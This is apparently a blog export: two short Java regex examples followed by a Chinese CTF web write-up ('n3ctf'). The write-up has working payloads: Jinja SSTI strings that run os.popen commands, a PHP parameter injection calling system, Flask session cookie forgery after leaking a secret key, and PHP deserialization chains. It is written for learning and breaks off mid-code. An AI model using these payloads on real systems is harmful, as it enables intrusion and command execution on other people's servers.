<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.regex.Matcher;</span><br><span class="line"><span class="keyword">import</span> java.util.regex.Pattern;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Replace</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * Pattern.compile (matcher) + Matcher</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        String data[] = &#123;<span class="string">&quot;[0-9]&#123;11&#125;&quot;</span>,<span class="string">&quot;[0-9]&#123;4&#125;\\.[0-9]&#123;1,2&#125;\\.[0-9]&#123;1,2&#125;&quot;</span>&#125;;</span><br><span class="line">       </span><br><span class="line">        Pattern r = Pattern.compile(data[<span class="number">1</span>]);</span><br><span class="line">        Matcher ans = r.matcher(<span class="string">&quot;2001.1.2&quot;</span>);</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span>(ans.find())&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;group:&quot;</span>+ans.group()); <span class="comment">// 2001.1.2</span></span><br><span class="line">            System.out.println(<span class="string">&quot;start:&quot;</span>+ans.start()); <span class="comment">// 0</span></span><br><span class="line">            System.out.println(<span class="string">&quot;end:&quot;</span>+ans.end()); <span class="comment">// 8</span></span><br><span class="line">            System.out.println(<span class="string">&quot;matches:&quot;</span>+ans.matches()); <span class="comment">// true</span></span><br><span class="line">            System.out.println(<span class="string">&quot;lookingAt:&quot;</span>+ans.lookingAt()); <span class="comment">// true</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;error&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="replace"><a href="#replace" class="headerlink" title="replace"></a>replace</h5><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.regex.Matcher;</span><br><span class="line"><span class="keyword">import</span> java.util.regex.Pattern;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Replace</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * Matcher</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        String input = <span class="string">&quot;dog&quot;</span>;</span><br><span class="line">        Pattern p = Pattern.compile(input);</span><br><span class="line">        Matcher m = p.matcher(<span class="string">&quot;catcatcatcatcatcatcatdogcatcatcatdog&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span>(m.find())&#123;</span><br><span class="line">            input = m.replaceAll(<span class="string">&quot;fish&quot;</span>);</span><br><span class="line">            System.out.println(input); <span class="comment">// catcatcatcatcatcatcatfishcatcatcatfish</span></span><br><span class="line">            input = m.replaceFirst(<span class="string">&quot;fish&quot;</span>); <span class="comment">// catcatcatcatcatcatcatfishcatcatcatdog</span></span><br><span class="line">            System.out.println(input);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>没有人比我更爱学习</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>序列化</tag>
        <tag>java反射</tag>
      </tags>
  </entry>
  <entry>
    <title>n3ctf_web_wp</title>
    <url>/2022/01/21/n3ctf-wp/</url>
    <content><![CDATA[<h5 id="00-F12"><a href="#00-F12" class="headerlink" title="00-F12"></a>00-F12</h5><p>签到，F12看js源码，查找flag就可以找到了</p>
<h5 id="01-headers"><a href="#01-headers" class="headerlink" title="01-headers"></a>01-headers</h5><p>（赛后复现的 打出来之后真的觉得自己还是太菜了</p>
<p>这道题存在信息泄露，简单的<code>robots.txt</code>（哎</p>
<p>然后进入<code>ydswantmanygfs.php</code>，直接说<code>You are not from yoshino-s.online</code>，那么直接抓包吧</p>
<p>可以在头信息中发现一个hint：<code> How to get remote ip</code></p>
<p>先试着用XFF传<code>yoshino-s.online</code>，但是页面没有改变，那么说明现在就要利用hint，remote ip也就是发出请求的主机ip，那么ping一下吧</p>
<p><img src="https://img-blog.csdnimg.cn/809c88f292764c74b9f624287d05aa16.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAYW1ldXU=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"></p>
<p>XFF换成<code>47.116.142.11</code>就可以得到flag了</p>
<span id="more"></span>

<h5 id="02-cookies"><a href="#02-cookies" class="headerlink" title="02-cookies"></a>02-cookies</h5><p>玩了一会之后可以发现cookie里面有score的值</p>
<p>可以直接拿去解码，这里的<code>%3d</code>是<code>=</code>，所以可以先猜测是base64</p>
<p><img src="https://img-blog.csdnimg.cn/62729a4795ec45c488e111424bc6158d.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAYW1ldXU=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"></p>
<p>Gunzip解密之后就是我们原本的成绩了</p>
<p>直接百度，可以知道加密方式是<code>Gzip</code></p>
<p>那么就直接用301一步一步加密回去，在score.php界面抓包，修改一下session就好了</p>
<p>payloao:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">H4sIAGWo6WEA/wXAAQkAAADCsEoe+3cbXwAStPRXAwAAAA==</span><br></pre></td></tr></table></figure>



<h5 id="04-template"><a href="#04-template" class="headerlink" title="04-template"></a>04-template</h5><p>没有任何过滤的模板注入</p>
<p>jinjia</p>
<p>直接打payload就好了，这里选择<code>catch_warnings</code>，直接写个脚本找吧，实在不行一个一个数</p>
<p>payload：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#123;&#x27;&#x27;.__class__.__bases__[0].__subclasses__()[213].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&quot;__import__(&#x27;os&#x27;).popen(&#x27;cat /flag&#x27;).read()&quot;)&#125;&#125;</span><br></pre></td></tr></table></figure>

<h5 id="05-php"><a href="#05-php" class="headerlink" title="05-php"></a>05-php</h5><p>陇原战役的题目，但是被改过了，直接看hint的phpinfo就可以找到flag</p>
<p>payload：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">C:4:&quot;Hint&quot;:0:&#123;&#125;</span><br></pre></td></tr></table></figure>

<h5 id="Ezhttpd"><a href="#Ezhttpd" class="headerlink" title="Ezhttpd"></a>Ezhttpd</h5><p>简单的代码审计</p>
<p>就以刚看到这道题的时候的顺序，我们一个一个文件审计：</p>
<p><strong>0x01:index.php</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">define(<span class="string">&quot;main&quot;</span>,<span class="string">&quot;main&quot;</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;evil.php&quot;</span>;</span><br><span class="line"><span class="variable">$temp</span> = <span class="keyword">new</span> Temp(<span class="variable">$_POST</span>);</span><br><span class="line"><span class="variable">$temp</span>-&gt;display(<span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>]);</span><br></pre></td></tr></table></figure>

<p>包含 <code>evil.php</code>，实例化<code>Temp</code>类，post传值，get传filename到display函数中</p>
<p><strong>0x02:evil.php</strong></p>
<p>// 重点！！  看完还是对方法有困惑的可以百度  “php魔术方法”  甚至可以去自学面向对象</p>
<p>1.这里主要就是<code>Temp</code>类，查看逐个方法</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$data</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;date = array_merge(<span class="keyword">$this</span>-&gt;date,<span class="variable">$data</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>__construct</code> 构造方法，在实例化类的时候自动调用，也就是我们在index.php利用post传的值就是这里$data的值；</p>
<p><code>array_merge</code>合并两个数组；</p>
<p>2.<code>getTempName</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getTempName</span>(<span class="params"><span class="variable">$template</span>,<span class="variable">$dir</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$dir</span> === <span class="string">&#x27;admin&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;template = str_replace(<span class="string">&#x27;..&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;./template/admin/&#x27;</span>.<span class="variable">$template</span>);</span><br><span class="line">        <span class="keyword">if</span>(!is_file(<span class="keyword">$this</span>-&gt;template))&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&quot;no!!&quot;</span>);</span><br><span class="line">         &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;template = <span class="string">&#x27;./template/index.html&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>传入相应参数，要求<code>$dir===&#39;admin&#39;</code>并修改<code>$this-&gt;template</code>的值；</p>
<p><code>str_replace</code>字符串替换函数；</p>
<p>3.<code>display</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">display</span>(<span class="params"><span class="variable">$template</span>,<span class="variable">$space</span>=<span class="string">&#x27;&#x27;</span></span>)</span>&#123;</span><br><span class="line">        extract(<span class="keyword">$this</span>-&gt;date);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;getTempName(<span class="variable">$template</span>,<span class="variable">$space</span>);</span><br><span class="line">        <span class="keyword">include</span>(<span class="keyword">$this</span>-&gt;template);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p><code>extract</code>对<code>$this-&gt;data</code>的值进行变量覆盖：</p>
<p>之后调用<code>getTempName</code>方法，这里我们会把display默认的参数<code>$space</code>再次传入<code>getTemlName</code>，别忘了我们之前审计的代码中要求传入的第二个参数要为<code>admin</code>，所以我们这里也要实现对space的修改，而由于有变量覆盖，所以我们可以利用post传sapce为admin，从而使得space进入<code>$this-&gt;date</code>，实现在变量覆盖的时候而方法中对<code>$this-&gt;template</code>进行了修改，并在最后包含<code>$this-&gt;template</code>表示的文件</p>
<p>4.<code>listdata</code></p>
<p>这个方法东西有点多，我就把最主要的拿出来吧</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$params</span> = explode(<span class="string">&#x27; &#x27;</span>, <span class="variable">$_params</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$params</span> <span class="keyword">as</span> <span class="variable">$t</span>) &#123;</span><br><span class="line">    <span class="variable">$var</span> = substr(<span class="variable">$t</span>, <span class="number">0</span>, strpos(<span class="variable">$t</span>, <span class="string">&#x27;=&#x27;</span>));</span><br><span class="line">    <span class="variable">$val</span> = substr(<span class="variable">$t</span>, strpos(<span class="variable">$t</span>, <span class="string">&#x27;=&#x27;</span>) + <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span> (!<span class="variable">$var</span>) &#123;</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">     &#125;</span><br><span class="line">     <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$system</span>[<span class="variable">$var</span>])) &#123;</span><br><span class="line">         <span class="variable">$system</span>[<span class="variable">$var</span>] = <span class="variable">$val</span>;</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">         <span class="variable">$param</span>[<span class="variable">$var</span>] = <span class="variable">$val</span>; </span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;function&#x27;</span>: </span><br><span class="line">	<span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$param</span>[<span class="string">&#x27;name&#x27;</span>])) &#123;</span><br><span class="line">        <span class="keyword">return</span>  <span class="string">&#x27;name参数不存在&#x27;</span>;</span><br><span class="line">     &#125; <span class="keyword">elseif</span> (!function_exists(<span class="variable">$param</span>[<span class="string">&#x27;name&#x27;</span>])) &#123;</span><br><span class="line">         <span class="keyword">return</span> <span class="string">&#x27;函数[&#x27;</span>.<span class="variable">$param</span>[<span class="string">&#x27;name&#x27;</span>].<span class="string">&#x27;]未定义&#x27;</span>;</span><br><span class="line">     &#125;</span><br><span class="line"></span><br><span class="line">     <span class="variable">$force</span> = <span class="variable">$param</span>[<span class="string">&#x27;force&#x27;</span>];</span><br><span class="line">     <span class="keyword">if</span> (<span class="variable">$force</span>) &#123;</span><br><span class="line">         <span class="variable">$p</span> = [];</span><br><span class="line">         <span class="keyword">foreach</span> (<span class="variable">$param</span> <span class="keyword">as</span> <span class="variable">$var</span> =&gt; <span class="variable">$t</span>) &#123;</span><br><span class="line">             <span class="keyword">if</span> (strpos(<span class="variable">$var</span>, <span class="string">&#x27;param&#x27;</span>) === <span class="number">0</span>) &#123;</span><br><span class="line">                 <span class="variable">$n</span> = intval(substr(<span class="variable">$var</span>, <span class="number">5</span>));</span><br><span class="line">                 <span class="variable">$p</span>[<span class="variable">$n</span>] = <span class="variable">$t</span>;</span><br><span class="line">              &#125;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">if</span> (<span class="variable">$p</span>) &#123;</span><br><span class="line">              <span class="variable">$rt</span> = call_user_func_array(<span class="variable">$param</span>[<span class="string">&#x27;name&#x27;</span>], <span class="variable">$p</span>);</span><br><span class="line">          &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">              <span class="variable">$rt</span> = call_user_func(<span class="variable">$param</span>[<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">          &#125;</span><br><span class="line">         <span class="keyword">return</span> <span class="variable">$rt</span>;</span><br><span class="line">     &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">         <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">     &#125;</span><br></pre></td></tr></table></figure>

<p><code>explode</code>将<code>$_params</code>以空格进行分割并返回数组形式，使得之后的遍历和赋值得以实现（自己去看源码理解</p>
<p>接下去第一段，判断<code>$param[&#39;name&#39;]</code>是否为定义并且是否为函数；</p>
<p>第二段，判断<code>$force</code>是否定义，若已定义那么再遍历<code>$param</code>并判断是否存在<code>param</code>键值，若存在那么就给<code>$p</code>赋值，若<code>$p</code>被赋值那么进入下面的if，利用<code>call_user_func_array</code>函数执行<code>$param[&#39;name&#39;]</code>函数，而<code>$p</code>的值则为该函数的参数</p>
<p><strong>0x03:admin/index.htmk</strong></p>
<p>发现三行php代码，看这三个变量<code>$img  $version  $mod</code>，前面两个是不是很眼熟，正式<code>Temp</code>类中<code>date</code>数组里面的，而经过变量覆盖之后我们可以调用，那么这里的<code>$mod</code>不是原数组里面的，那么说明我们可以通过post传参从而实现调用<code>$mod</code>，然后进入listdata方法，绕过一个个if语句到最后的<code>call_user_func_array($param[&#39;name&#39;], $p)</code>进行代码执行</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;img src=&quot;&lt;?php echo $img;?&gt;&quot;&gt;</span><br><span class="line">&lt;div&gt;&lt;?php echo $this-&gt;listdata(&quot;action=list module=$mod&quot;);?&gt;&lt;div&gt;</span><br><span class="line">&lt;h6&gt;version: &lt;?php echo $version;?&gt;&lt;/h6&gt;</span><br></pre></td></tr></table></figure>

<p><strong>0x04:解题+总结</strong></p>
<p>现在代码都走一遍了，但是要怎么调用<code>call_user_func_array</code>，还是有点迷惑，这里重点在于<code>explode</code>函数，因为他会将我们传入的<code>mod</code>通过空格分隔出来，就比如源代码是<code>action=list module=$mod</code>，最后就会被分成<code>action=list</code>和<code>module=$mod</code>,那么如果我们<code>$mod</code>传入的时候就会自带空格呢，直接举个例子吧：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$a</span> = <span class="string">&#x27;a&#x27;</span>;</span><br><span class="line"><span class="variable">$b</span> = <span class="string">&quot;action=list module=<span class="subst">$a</span>&quot;</span>;</span><br><span class="line"><span class="variable">$c</span> = explode(<span class="string">&quot; &quot;</span>,<span class="variable">$b</span>);</span><br><span class="line">var_dump(<span class="variable">$c</span>);</span><br><span class="line"><span class="comment">//array(2) &#123;</span></span><br><span class="line"><span class="comment">//  [0]=&gt;</span></span><br><span class="line"><span class="comment">//  string(11) &quot;action=list&quot;</span></span><br><span class="line"><span class="comment">//  [1]=&gt;</span></span><br><span class="line"><span class="comment">//  string(8) &quot;module=a&quot;    </span></span><br><span class="line"><span class="comment">//&#125;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$a</span> = <span class="string">&#x27;a action=function name=1&#x27;</span>;</span><br><span class="line"><span class="variable">$b</span> = <span class="string">&quot;action=list module=<span class="subst">$a</span>&quot;</span>;</span><br><span class="line"><span class="variable">$c</span> = explode(<span class="string">&quot; &quot;</span>,<span class="variable">$b</span>);</span><br><span class="line">var_dump(<span class="variable">$c</span>);</span><br><span class="line"><span class="comment">//array(4) &#123;</span></span><br><span class="line"><span class="comment">//  [0]=&gt;</span></span><br><span class="line"><span class="comment">//  string(11) &quot;action=list&quot;    </span></span><br><span class="line"><span class="comment">//  [1]=&gt;</span></span><br><span class="line"><span class="comment">//  string(8) &quot;module=a&quot;        </span></span><br><span class="line"><span class="comment">//  [2]=&gt;</span></span><br><span class="line"><span class="comment">//  string(15) &quot;action=function&quot;</span></span><br><span class="line"><span class="comment">//  [3]=&gt;</span></span><br><span class="line"><span class="comment">//  string(6) &quot;name=1&quot;</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br></pre></td></tr></table></figure>

<p>清晰明了，因为在遍历中会出现两次<code>action</code>，那么前面的list肯定就会被后面的function给覆盖了呀，那么应该都懂了最后我们<code>$mod</code>的构造方法了吧，那之后只要根据代码构造我们想要的东西就好了</p>
<p>payload:</p>
<p>（为什么要用%09呢，dddd</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">get:</span><br><span class="line">filename=index.html</span><br><span class="line">post:</span><br><span class="line">space=admin &amp;</span><br><span class="line">mod=1 action=function name=system force=1 param=ls%09/</span><br></pre></td></tr></table></figure>

<h5 id="EasyPython"><a href="#EasyPython" class="headerlink" title="EasyPython"></a>EasyPython</h5><p>工具：<a href="https://github.com/noraj/flask-session-cookie-manager">flask session</a></p>
<p>flask session伪造 + 简单的模板注入</p>
<p>既然题目说是python，那么直接试着在filename上查看<code>app,py</code>,可以直接得到源码</p>
<p><strong>0x01:</strong></p>
<p>存在secret_key <code>app.config[&#39;SECRET_KEY&#39;]=secret.SECRET_KEY</code>，而SECRET_KEY取值于在secret.py文件中</p>
<p><strong>0x02:/source</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/source&#x27;</span>, methods=[<span class="string">&quot;GET&quot;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show_source</span>():</span></span><br><span class="line">    filename = request.args.get(<span class="string">&#x27;filename&#x27;</span>,<span class="string">&#x27;jinchengshu.jpg&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> filename.endswith(<span class="string">&quot;.py&quot;</span>) <span class="keyword">or</span> <span class="string">&#x27;flag&#x27;</span> <span class="keyword">in</span> filename <span class="keyword">or</span> <span class="string">&#x27;..&#x27;</span> <span class="keyword">in</span> filename:</span><br><span class="line">        f = <span class="string">&quot;&quot;</span>.join(<span class="built_in">open</span>(__file__,<span class="string">&#x27;r&#x27;</span>).readlines())</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;nononono! you too young!give you source!! &lt;br&gt;&quot;</span>+f</span><br><span class="line">    f = <span class="string">&quot;let&#x27;s look look shuaige&#x27;s pho;He is so handsome. He used to be called jinchengwu, but now he is called jinchengshu;&lt;br&gt;&lt;br&gt;&quot;</span></span><br><span class="line">    f += <span class="string">&quot;&lt;img src=data:image/jpeg;base64,&quot;</span>+base64.b64encode(<span class="built_in">open</span>(filename,<span class="string">&#x27;rb&#x27;</span>).read()).decode()+<span class="string">&quot;&gt;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> f</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>1.get方式传filename并对其内容进行进行判断，以<code>.py</code>为结尾、包含<code>flag or ..</code>则返回当前文件的内容</p>
<p>2.<code>base64.b64encode(open(filename,&#39;rb&#39;).read()).decode()</code>实现读取文件的源码</p>
<p>现在我们已知<code>SECRET_KEY</code>在secret文件中，并且还可以通过代码得到源码，所以我们要先绕过第一个if并且读取出secret.py文件里面的内容</p>
<p>hint： <code>__pycache__</code> （自行百度吧</p>
<p>百度之后并测试之后可以得到文件的路径是</p>
<p>payload1：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">filename=./__pycache__/secret.cpython-35.pyc （这里的35是python的版本，因为本地测试的时候39，但题目的python版本的3.5</span><br></pre></td></tr></table></figure>

<p>然后就可以得到源码，解密得到Secret-Key</p>
<p><strong>0x03:/ssti</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/ssti&#x27;</span>,methods=[<span class="string">&#x27;POST&#x27;</span>,<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ssti</span>():</span></span><br><span class="line">    <span class="built_in">print</span>(session)</span><br><span class="line">    info = session[<span class="string">&quot;info&quot;</span>]</span><br><span class="line">    data = request.form.get(<span class="string">&quot;data&quot;</span>,<span class="string">&quot;&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> info[<span class="string">&quot;admin&quot;</span>]==<span class="string">&quot;admin&quot;</span>:</span><br><span class="line">        <span class="keyword">return</span> render_template_string(data)</span><br><span class="line">    <span class="keyword">else</span> :</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;have one more try young man&quot;</span></span><br></pre></td></tr></table></figure>

<p>1.这里只有一个点就是<code>info[&quot;admin&quot;]==&quot;admin&quot;</code>，等式成功之后就会导致<code>render_template_string(data)</code>，对data的值进行渲染造成模板注入</p>
<p>注意这里的info的值来自于session，那么直接查看session是什么样的。可以发现session被分成了三段，再根据题目flask，可以大胆猜测是flask session伪造（主要是之前做过同类型题目</p>
<p><img src="http://82.156.2.166/static/img/image-20211129183924992.png"></p>
<p>既然前面已经拿到<code>SECRET_KEY</code>了，那么就直接用工具加密，然后修改session，传data进行模板注入</p>
<p>payload2：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">session：eyJpbmZvIjp7ImFkbWluIjoiYWRtaW4ifX0.YaN-KQ.tuTHvwPH5IxVm0ct06b9d8F1iZc </span><br></pre></td></tr></table></figure>

<p>payload3：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">data=&#123;&#123;&#x27;&#x27;.__class__.__bases__[0].__subclasses__()[375].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&quot;__import__(&#x27;os&#x27;).popen(&#x27;ls&#x27;).read()&quot;)&#125;&#125;</span><br></pre></td></tr></table></figure>

<h5 id="Ezunser"><a href="#Ezunser" class="headerlink" title="Ezunser"></a>Ezunser</h5><p>反序列化未定义的类</p>
<p>直接给了源码：</p>
<p><code>index.php</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">myAutoloader</span>(<span class="params"><span class="variable">$classname</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">include</span> <span class="variable">$classname</span>.<span class="string">&quot;.php&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;pop&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$pop</span> = <span class="variable">$_REQUEST</span>[<span class="string">&#x27;pop&#x27;</span>];</span><br><span class="line">    <span class="variable">$o</span> = unserialize(<span class="variable">$pop</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line">    spl_autoload_register(<span class="string">&#x27;myAutoloader&#x27;</span>);</span><br><span class="line">    <span class="variable">$raw</span> = serialize(<span class="variable">$o</span>);</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/Evil/&quot;</span>,<span class="variable">$raw</span>))&#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&quot;Evil Classes!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$o</span> = unserialize(<span class="variable">$pop</span>);</span><br><span class="line">    var_dump(<span class="variable">$o</span>);</span><br><span class="line">&#125;<span class="keyword">else</span> &#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br/&gt;EvillClass.php&quot;</span>;</span><br><span class="line">    highlight_file(<span class="string">&quot;EvilClass.php&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>0x01:</strong></p>
<p>先审计<code>index.php</code></p>
<p>第一个点在于<code>spl_autoload_register</code>，当调用<code>index.php</code>中没有定义的类的时候就会自动调用<code>myAutoloader($classname)</code>，其中<code>$classname</code>就是我们想实例化的类</p>
<p>想当然地我们想调用<code>EvilClass.php</code>里面的类，所以要<code>include EvilClass.php</code>，但是文件里还是没有定义<code>EvilClass</code>，这里就涉及到一个[php反序列的冷知识](<a href="https://zhuanlan.zhihu.com/p/405838002">PHP序列化冷知识 - 知乎 (zhihu.com)</a>)</p>
<p>我们还发现之后的if判断语句中ban掉了<code>Evil</code>，这就说明在序列化之后的字符串中不能再出现<code>EvilClass</code>，不过可以直接拿里面的payload</p>
<p>所以payload1：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">a:1:&#123;i:0;O:22:&quot;__PHP_Incomplete_Class&quot;:1:&#123;s:3:&quot;qwb&quot;;O:9:&quot;EvilClass&quot;:0:&#123;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>



<p><code>EvilClass.php</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line">   </span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">static</span> <span class="variable">$a</span> = <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">static</span> <span class="variable">$b</span> = <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">static</span> <span class="variable">$allowfunc</span> = [<span class="string">&quot;var_dump&quot;</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;a-&gt;read();</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;lock lock read!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">D</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">read</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        B::<span class="variable">$b</span> = <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;b-&gt;learn();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">E</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        B::<span 